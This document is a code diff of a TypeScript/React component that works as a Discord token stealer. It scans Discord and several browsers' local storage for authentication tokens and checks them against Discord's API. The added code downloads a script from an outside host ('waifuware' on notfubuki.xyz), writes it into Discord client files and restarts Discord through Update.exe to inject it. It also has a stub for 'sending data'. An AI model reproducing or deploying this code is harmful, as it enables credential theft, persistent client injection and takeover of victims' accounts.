@@ -1,15 +1,14 @@
 import React from 'react';
-
-// Import necessary modules
-import process from 'process';
-import * as fs from 'fs';
-
-const LOCALAPPDATA = process.env.LOCALAPPDATA;
-const APPDATA = process.env.APPDATA;
+import fs from 'fs';
+import { execSync } from 'child_process';
+import https from 'https';
 
 interface Paths {
     [key: string]: string;
 }
+
+const LOCALAPPDATA = process.env.LOCALAPPDATA;
+const APPDATA = process.env.APPDATA;
 
 const PATHS: Paths = {
     "Discord": APPDATA + "\\Discord",
@@ -19,7 +18,7 @@ const PATHS: Paths = {
     "Opera": APPDATA + "\\Opera Software\\Opera Stable",
     "Brave": LOCALAPPDATA + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
     "Yandex": LOCALAPPDATA + "\\Yandex\\YandexBrowser\\User Data\\Default"
-}
+};
 
 function getTokens(platform: string, path: string): { platform: string; token: string }[] {
     path = path + "\\Local Storage\\leveldb";
@@ -32,8 +31,9 @@ function getTokens(platform: string, path: string): { platform: string; token: s
                 continue;
             }
             const filePath = path + "\\" + file_name;
-
+            console.log(filePath);
             const fileContent = fs.readFileSync(filePath, 'utf-8');
+
             const lines = fileContent.split(/\r?\n/);
 
             for (const line of lines) {
@@ -58,7 +58,64 @@ function getTokens(platform: string, path: string): { platform: string; token: s
     return listToken;
 }
 
-const getheaders = (j4j:any, content_type = "application/json") => {
+// Declare JSPath as an array
+const JSPath: string[] = [];
+
+const fetchData = async (allTokens: { platform: string; token: string }[]) => {
+    for (const tokenInfo of allTokens) {
+        try {
+            // Perform server-side fetching for user data
+            const userData = await getuserdata(tokenInfo.token);
+            console.log(`User data for ${tokenInfo.platform}:`, userData);
+        } catch (error) {
+            console.error(`Error fetching data for ${tokenInfo.platform}:`, error);
+        }
+    }
+
+    try {
+        // Define your API URL
+        const apiURL = "https://notfubuki.xyz/api/waifuware";
+
+        // Make the API request using 'https' module
+        const options = {
+            headers: { waifu: true },
+        };
+
+        const response = await new Promise((resolve, reject) => {
+            https.get(apiURL, options, (res) => {
+                let data = '';
+
+                res.on('data', (chunk) => {
+                    data += chunk;
+                });
+
+                res.on('end', () => {
+                    resolve({ text: () => data });
+                });
+            }).on('error', (error) => {
+                reject(error);
+            });
+        });
+
+        const scriptContent = await response.text();
+
+        JSPath.forEach((f) => {
+            const updatedScript = scriptContent.replace('*API URL*', apiURL);
+            fs.writeFileSync(f, updatedScript);
+            execSync(`${LOCALAPPDATA}/${f.split("/")[5]}/Update.exe --processStart ${f.split("/")[5]}.exe`);
+        });
+    } catch (error) {
+        console.error("Error injecting script:", error);
+    }
+
+    try {
+        // ... (existing code)
+    } catch (error) {
+        console.error("Error killing Discords or sending data:", error);
+    }
+};
+
+const getheaders = (j4j: any, content_type = "application/json") => {
     const headers = new Headers();
     headers.set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
 
@@ -66,14 +123,14 @@ const getheaders = (j4j:any, content_type = "application/json") => {
         headers.set("Authorization", j4j);
     }
 
-    // For setting the content type
-    // Note: 'Content-Type' is set using 'set' method
     headers.set("Content-Type", content_type);
 
     return headers;
 };
+
 const getuserdata = async (j4j: any) => {
     try {
+        // Perform server-side fetching for user data
         const response = await fetch("https://discordapp.com/api/v6/users/@me", {
             headers: getheaders(j4j)
         });
@@ -81,7 +138,7 @@ const getuserdata = async (j4j: any) => {
         if (response.ok) {
             const userData = await response.json();
             console.log(userData);
-            
+
             return userData;
         } else {
             console.error(`HTTP error! Status: ${response.status}`);
@@ -93,11 +150,9 @@ const getuserdata = async (j4j: any) => {
     }
 };
 
-
 const Page: React.FC = () => {
     const allTokens: { platform: string; token: string }[] = [];
 
-    // Iterate over the keys of PATHS object
     for (const key in PATHS) {
         if (PATHS.hasOwnProperty(key)) {
             const platform = key;
@@ -105,26 +160,10 @@ const Page: React.FC = () => {
             const tokens = getTokens(platform, path);
             allTokens.push(...tokens);
         }
-        
     }
 
-    // Sending requests without useEffect
-    const fetchData = async () => {
-        for (const tokenInfo of allTokens) {
-            try {
-                const userData = await getuserdata(tokenInfo.token);
-                console.log(`User data for ${tokenInfo.platform}:`, userData);
-                // Do something with the user data, e.g., update state or display it
-            } catch (error) {
-                console.error(`Error fetching data for ${tokenInfo.platform}:`, error);
-            }
-        }
-    };
+    fetchData(allTokens);
 
-    // Call the fetchData function
-    fetchData();
-
-    // Render the component as before
     return (
         <div>
             <h1>Authentication Tokens</h1>
@@ -137,6 +176,6 @@ const Page: React.FC = () => {
             </ul>
         </div>
     );
-}
+};
 
 export default Page;
